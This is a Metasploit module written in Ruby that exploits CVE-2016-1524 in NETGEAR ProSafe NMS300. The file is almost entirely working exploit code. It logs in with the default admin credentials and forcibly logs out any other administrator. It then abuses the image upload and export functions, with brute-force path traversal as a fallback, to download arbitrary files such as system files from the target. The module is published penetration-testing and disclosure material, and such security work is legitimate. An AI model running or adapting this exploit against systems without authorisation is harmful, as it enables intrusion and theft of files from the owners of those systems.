##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'NETGEAR ProSafe Network Management System 300 Authenticated File Download',
      'Description' => %q{
        Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.
        The application has a file download vulnerability that can be exploited by an
        authenticated remote attacker to download any file in the system.
        This module has been tested with versions 1.5.0.2, 1.4.0.17 and 1.1.0.13.
      },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and updated MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2016-1524'],
          ['US-CERT-VU', '777024'],
          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt'],
          ['URL', 'https://seclists.org/fulldisclosure/2016/Feb/30']
        ],
      'DisclosureDate' => 'Feb 4 2016'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true,  "Application path", '/']),
        OptString.new('USERNAME', [true, 'The username to login as', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for the specified username', 'admin']),
        OptString.new('FILEPATH', [false, 'Path of the file to download minus the drive letter', '/Windows/System32/calc.exe']),
      ])

    register_advanced_options(
      [
        OptInt.new('DEPTH', [false, 'Max depth to traverse', 15])
      ])
  end

  def authenticate
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'userSession.do'),
      'method' => 'POST',
      'vars_post' => {
        'userName' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      },
      'vars_get' => { 'method' => 'login' }
    })

    if res && res.code == 200
      cookie = res.get_cookies
      if res.body.to_s =~ /"loginOther":true/ && res.body.to_s =~ /"singleId":"([A-Z0-9]*)"/
        # another admin is logged in, let's kick him out
        res = send_request_cgi({
          'uri'    => normalize_uri(datastore['TARGETURI'], 'userSession.do'),
          'method' => 'POST',
          'cookie' => cookie,
          'vars_post' => { 'singleId' => $1 },
          'vars_get' => { 'method' => 'loginAgain' }
        })
        if res && res.code == 200 && (not res.body.to_s =~ /"success":true/)
          return nil
        end
      end
      return cookie
    end
    return nil
  end


  def download_file (download_path, cookie)
    filename = Rex::Text.rand_text_alphanumeric(8 + rand(10)) + ".img"
    begin
      res = send_request_cgi({
        'method' => 'POST',
        'cookie' => cookie,
        'uri' => normalize_uri(datastore['TARGETURI'], 'data', 'config', 'image.do'),
        'vars_get' => {
          'method' => 'add'
        },
        'vars_post' => {
          'realName' => download_path,
          'md5' => '',
          'fileName' => filename,
          'version' => Rex::Text.rand_text_alphanumeric(8 + rand(2)),
          'vendor' =>  Rex::Text.rand_text_alphanumeric(4 + rand(3)),
          'deviceType' => rand(999),
          'deviceModel' => Rex::Text.rand_text_alphanumeric(5 + rand(3)),
          'description' => Rex::Text.rand_text_alphanumeric(8 + rand(10))
        },
      })

      if res && res.code == 200 && res.body.to_s =~ /"success":true/
        res = send_request_cgi({
          'method' => 'POST',
          'cookie' => cookie,
          'uri' => normalize_uri(datastore['TARGETURI'], 'data', 'getPage.do'),
          'vars_get' => {
            'method' => 'getPageList',
            'type' => 'configImgManager',
          },
          'vars_post' => {
            'everyPage' => 500 + rand(999)
          },
        })

        if res && res.code == 200 && res.body.to_s =~ /"imageId":"([0-9]*)","fileName":"#{filename}"/
          image_id = $1
          return send_request_cgi({
            'uri'    => normalize_uri(datastore['TARGETURI'], 'data', 'config', 'image.do'),
            'method' => 'GET',
            'cookie' => cookie,
            'vars_get' => {
              'method' => 'export',
              'imageId' => image_id
            }
          })
        end
      end
      return nil
    rescue Rex::ConnectionRefused
      print_error("#{peer} - Could not connect.")
      return
    end
  end


  def save_file(filedata)
    vprint_line(filedata.to_s)
    fname = File.basename(datastore['FILEPATH'])

    path = store_loot(
      'netgear.http',
      'application/octet-stream',
      datastore['RHOST'],
      filedata,
      fname
    )
    print_good("File saved in: #{path}")
  end

  def run
    cookie = authenticate
    if cookie == nil
      fail_with(Failure::Unknown, "#{peer} - Failed to log in with the provided credentials.")
    else
      print_good("#{peer} - Logged in with #{datastore['USERNAME']}:#{datastore['PASSWORD']} successfully.")
      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'], proof: cookie) # more consistent service_name and protocol
    end

    if datastore['FILEPATH'].blank?
      fail_with(Failure::Unknown, "#{peer} - Please supply the path of the file you want to download.")
      return
    end

    filepath = datastore['FILEPATH']
    res = download_file(filepath, cookie)
    if res && res.code == 200
      if res.body.to_s.bytesize != 0 && (not res.body.to_s =~/This file does not exist./) && (not res.body.to_s =~/operation is failed/)
        save_file(res.body)
        return
      end
    end

    print_error("#{peer} - File not found, using bruteforce to attempt to download the file")
    count = 1
    while count < datastore['DEPTH']
      res = download_file(("../" * count).chomp('/') + filepath, cookie)
      if res && res.code == 200
        if res.body.to_s.bytesize != 0 && (not res.body.to_s =~/This file does not exist./) && (not res.body.to_s =~/operation is failed/)
          save_file(res.body)
          return
        end
      end
      count += 1
    end

    print_error("#{peer} - Failed to download file.")
  end
end
